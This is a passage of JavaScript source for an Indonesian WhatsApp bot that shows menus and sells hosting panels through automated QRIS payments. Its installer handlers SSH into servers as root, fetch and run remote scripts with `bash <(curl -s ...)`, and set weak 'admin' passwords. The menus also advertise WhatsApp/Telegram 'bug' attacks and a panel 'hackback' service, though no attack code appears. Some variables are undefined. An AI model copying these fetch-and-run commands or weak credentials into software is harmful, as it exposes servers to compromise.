header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                 

case "funmenu": case "scmdmenu": {
const teks12 = `╔─═⊱ *「 \`FUN\` 」* ─═⬣
│┏⊱
║⿻ confess
║⿻ balasmenfess
║⿻ tolakmenfess
║⿻ stopmenfess
║⿻ bekerja
║⿻ sound1 - sound161
║⿻ mangkane1 - mangkane54 ( sound )
║⿻ acumalaka ( sound )
║⿻ reza-kecap ( sound )
║⿻ farhan-kebab ( sound )
║⿻ omaga ( sound )
║⿻ kamu-nanya ( sound )
║⿻ anjay ( sound )
║⿻ siuu ( sound )
║⿻ jodoh
║⿻ cekkhodam
║⿻ cekganteng
║⿻ cekcantik
║⿻ kapankah
║⿻ ceksange
║⿻ cekkontol
║⿻ cekmemek
║⿻ cekjomok
║⿻ tambah
║⿻ kurang
║⿻ kali
║⿻ bagi
║⿻ paptt1
║⿻ paptt2
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                 

case "installermenu": case "installmenu": {
const teks12 = `╔─═⊱ *「 \`INSTALLER\` 」* ─═⬣
│┏⊱
║⿻ hackbackpanel
║⿻ hackbackpanel2
║⿻ installpanel
║⿻ installpanel2
║⿻ startwings
║⿻ installthema
║⿻ installtemastellar
║⿻ installtemanebula
║⿻ installtemanightcore
║⿻ installtemabilling
║⿻ installtemaenigma
║⿻ uninstallpanel
║⿻ uninstalltema
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                 

case "grubmenu": case "groupmenu": {
const teks12 = `╔─═⊱ *「 \`GROUP\` 」* ─═⬣
│┏⊱
║⿻ add
║⿻ antilink
║⿻ antilink2
║⿻ antilinkall
║⿻ antitoxic
║⿻ antilinkwa
║⿻ mute
║⿻ blacklistjpm
║⿻ welcome
║⿻ invite
║⿻ kick
║⿻ kicktime
║⿻ gcsider
║⿻ creategc
║⿻ close
║⿻ closetime
║⿻ opentime
║⿻ open
║⿻ hidetag
║⿻ spamtag
║⿻ kudetagc
║⿻ kudetagc2
║⿻ promoteall
║⿻ demoteall
║⿻ promote
║⿻ demote
║⿻ resetlinkgc
║⿻ on
║⿻ off
║⿻ linkgc
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                  
         
case "ownermenu": {
const teks12 = `╔─═⊱ *「 \`OWNER CMD\` 」* ─═⬣
│┏⊱
║⿻ autoread
║⿻ adddomain
║⿻ deldomain
║⿻ listdomain
║⿻ blokir
║⿻ unblokir
║⿻ layanan
║⿻ tagsw
║⿻ upswtag
║⿻ cekdns
║⿻ cekhost
║⿻ cekip
║⿻ trackip
║⿻ cekweb
║⿻ ceksubdo
║⿻ sendngl
║⿻ otomatisauto
║⿻ cekinfo
║⿻ autopromosi
║⿻ autoreadsw
║⿻ autotyping
║⿻ addcase
║⿻ delcase
║⿻ getcase
║⿻ getcase2
║⿻ listcase
║⿻ renamecase
║⿻ addfunction
║⿻ delfunction
║⿻ addowner
║⿻ delowner
║⿻ listowner
║⿻ addprem
║⿻ delprem
║⿻ listprem
║⿻ self/public
║⿻ settppbot
║⿻ clearsession
║⿻ clearchat
║⿻ restartbot
║⿻ getip
║⿻ daftarsc
║⿻ hapussc
║⿻ svsc
║⿻ sendsc
║⿻ info
║⿻ script
║⿻ runtime
║⿻ getfile
║⿻ listgc
║⿻ joingc
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                        

case "produk2": {
  
  const date = new Date();

  // Profil pengguna
  const profileText = `
┌───📋 *PROFIL PENGGUNA* ───┐
│ 👤 *Nama*  : ${m.pushName}
│ 👤 *Nomor*  : ${m.sender.split("@")[0]}
└────────────────────────────┘
`;

  // Teks utama
  const teks = `
┌───🌟 *Simple Bot Shop V11* 🌟───┐
│ ✨ *Selamat datang di Simple Bot Shop!*  
│ 💎 *Tempat terbaik untuk memenuhi kebutuhan digital Anda!*  
│ 🎯 *Pilih kategori di bawah ini untuk memulai:*  
└────────────────────────────┘
`;

  client.sendMessage(m.chat, {
    caption: profileText + teks,
    footer: "Danny S8X",
    image: fs.readFileSync("./source/media/Xyz.jpg"),
    buttons: [
      { buttonId: '.owner', buttonText: { displayText: 'Owner Danny S8X 🔹' }, type: 1 },
      {
        buttonId: 'single_select',
        buttonText: { displayText: '⃟༑⌁⃰𝐃𝐞‌𝐬𝐭𝐫‌𝐮𝐢𝐝𝐨𝐫 𝐗‌𝐒ཀ‌‌' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "Pilih Produk Tersedia",
            sections: [
              {
                title: "💻 *Buypanel dan Admin Panel*",
                rows: [
                  { title: "🖥️ Produk Buypanel", description: "💼 Solusi panel hosting otomatis untuk bisnis Anda.\n🔍 *Detail*: Harga mulai Rp50.000, proses cepat.", id: ".buypanel" },
                  { title: "🔧 Produk Admin Panel", description: "👨‍💻 Kelola panel admin dengan mudah dan profesional.\n🔍 *Detail*: Admin panel lengkap, user-friendly.", id: ".buyadminpanel" }
                ]
              },
              {
                title: "🌐 *VPS dan Hosting*",
                rows: [
                  { title: "🌍 Produk Buy VPS", description: "💻 VPS premium dengan kapasitas fleksibel.\n🔍 *Detail*: Harga bersaing, performa stabil.", id: ".buyvps" }
                ]
              },
              {
                title: "📜 Jual Script Canggih",
                rows: [
                  { title: "🔹️List Script ( Simple Bot V11 )", description: "📌 List Script Untuk Menlihat Semua Script Yang Di Jual Oleh Bot", id: ".buysc" }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 4,
    viewOnce: true
  }, { quoted: loli });
}
break

case "layanan": case "produk": {
				
const teks = `\`\`\`SILAHKAN PILIH LAYANAN YANG TERSEDIA\`\`\``
await client.sendMessage(m.chat, {
  footer: `${footer}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐎𝐩𝐭𝐢͢𝐨𝐧𝐬',
          sections: [
            {
              title: '𝑪𝒉𝒐𝒐𝒔𝒆 ( 📑 ) 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔 𝑩𝒆𝒍𝒐𝒘',
              highlight_label: '𐁘',
              rows: [
                                {
                                    title: "𝐉𝐀𝐒𝐀 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐓𝐇𝐄𝐌𝐄",
                                    description: "install thema keren",
                                    id: ".jasainstalltema"
                                },
                                {
                                    title: "𝐉𝐀𝐒𝐀 𝐇𝐀𝐂𝐊𝐁𝐀𝐂𝐊 𝐏𝐀𝐍𝐄𝐋",
                                    description: "hack kembali panel bot whatsapp",
                                    id: ".jasahbpanel"
                                },
                                {
                                    title: "𝐏𝐀𝐍𝐄𝐋 𝐏𝐓𝐄𝐑𝐎𝐃𝐀𝐂𝐓𝐘𝐋",
                                    description: "panel run bot",
                                    id: ".buypanel"
                                },
                                {
                                    title: "𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋",
                                    description: "reseller panel bot",
                                    id: ".buyresellerpanel"
                                },
                                {
                                    title: "𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋",
                                    description: "admin panel bot",
                                    id: ".buyadp"
                                },
                                {
                                    title: "𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋",
                                    description: "owner panel bot",
                                    id: ".buyownpanel"
                                },
                                {
                                    title: "𝐏𝐀𝐑𝐓𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋",
                                    description: "partner panel bot",
                                    id: ".buyptpanel"
                                },
                                {
                                    title: "𝐕𝐏𝐒 𝐃𝐈𝐆𝐈𝐓𝐀𝐋 𝐎𝐂𝐄𝐀𝐍",
                                    description: "vps do untuk run bot",
                                    id: ".buyvps"
                                },
                                {
                                    title: "𝐀𝐊𝐔𝐍 𝐃𝐈𝐆𝐈𝐓𝐀𝐋 𝐎𝐂𝐄𝐀𝐍",
                                    description: "akun do untuk create vps",
                                    id: ".buydo"
                                },
                                {
                                    title: "𝐒𝐇𝐀𝐑𝐄",
                                    description: "jasa share/jpm untuk membantu promosi",
                                    id: ".buyjasashare"
                                },
                                {
                                    title: "𝐅𝐈𝐓𝐔𝐑 𝐒𝐂𝐑𝐈𝐏𝐓",
                                    description: "beli fitur script premium dan menarik",
                                    id: ".buyfitur"
                                },
                                {
                                    title: "𝐒𝐂𝐑𝐈𝐏𝐓",
                                    description: "beli script Simple Bot V11",
                                    id: ".buysc"
                                },
                                {
                                    title: "𝐒𝐓𝐎𝐂𝐊 𝐒𝐂𝐑𝐈𝐏𝐓",
                                    description: "beli stock script yang disediakan owner",
                                    id: ".listscript"
                                },
                                {
                                    title: "𝐃𝐎𝐌𝐀𝐈𝐍",
                                    description: "domain untuk create subdo",
                                    id: ".buydomain"
                                },
                                {
                                    title: "𝐉𝐀𝐒𝐀 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐏𝐀𝐍𝐄𝐋",
                                    description: "install panel bot whatsapp",
                                    id: ".jasainstallpanel"
                                }
                                ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: fs.readFileSync("./source/media/Xyz.jpg"),
  caption: `${teks}`,
  contextInfo: {
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namasaluran
   }
  },
}, {quoted: loli})
}
break;

case "buyptpanel": {
    if (m.isGroup) return reply("❌ *Pembelian Partner Panel Pterodactyl hanya bisa di dalam private chat!*");
    if (db.users[m.sender].status_deposit) return reply("⚠️ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    if (!text) return reply(example("username"));
    if (text.includes(" ")) return reply("⚠️ *Username tidak boleh memakai spasi!*");

    let us = crypto.randomBytes(2).toString('hex');
    let Obj = {};
    Obj.harga = "30000"; // Harga untuk panel publik
    Obj.username = text.toLowerCase() + us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(20, 50);

    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    const teks3 = `
    🛒 *INFORMASI PEMBAYARAN*

        *💳 ID Transaksi :* ${get.data.result.transactionId}
        *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *📦 Barang :* PT Panel Pterodactyl
        *⏳ Pembayaran Expired :* 5 menit

        ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Pt Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, {text: "❌ QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);

        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data;

        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
            🎉 *PEMBAYARAN BERHASIL DITERIMA ✅*

            📜 *ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}
            💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}
            🎁 *Barang:* Partner Panel Pterodactyl
            `}, {quoted: db.users[m.sender].saweria.msg});

            let username = Obj.username;
            let email = username + "@gmail.com";
            let name = capital(username);
            let password = crypto.randomBytes(4).toString('hex');

            let f = await fetch(global.global.domain + "/api/application/users", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    "email": email,
                    "username": username.toLowerCase(),
                    "first_name": name,
                    "last_name": "Admin",
                    "root_admin": true,
                    "language": "en",
                    "password": password.toString()
                })
            });

            let data = await f.json();
            if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
            let user = data.attributes;
            var teks = `
            🎉 *Berhasil Membuat Partner Panel ✅*

            📑 *ID User:* ${user.id}
            👤 *Nama:* ${user.first_name}
            🏷 *Username:* ${user.username}
            🔑 *Password:* ${password.toString()}
            🌐 *Login:* ${global.global.domain}
            🗣 *Gabung Whatsapp:* ${global.linkgbbuypublic}

            *⚠️ Rules Partner Panel:*
            - Jangan Maling SC! Jika ketahuan, akun akan dihapus!
            - Simpan data akun ini dengan baik!
            - Gunakan panel seperlunya saja, jangan asal buat!
            - Untuk klaim garansi, wajib membawa bukti SS saat pembelian.
            `;

            await client.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null});
            await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}

break

case "installbuyyer1": {
 if (m.isGroup) return reply("jasa install panel hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 5000 + generateRandomNumber(0, 0);

 // Updated API request to use new URL and API key
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

 const teksPembayaran = `
 *▧ INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Install Panel Pterodactyl
 *• Expired :* 5 menit

 *Note :*
 QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
 `

 let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await client.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 
 // Updated API request to check the payment status using new API URL and API key
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 await client.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi panel" }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria; 

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await client.sendMessage(m.chat, {text: teks}, {quoted: loli})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}

}
}
break

case "installbuyyer2": {
 if (m.isGroup) return reply("jasa install panel hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 6000 + generateRandomNumber(0, 0);

 // Updated API request to use new URL and API key
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

 const teksPembayaran = `
 *▧ INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Install Panel Pterodactyl
 *• Expired :* 5 menit

 *Note :*
 QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
 `

 let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
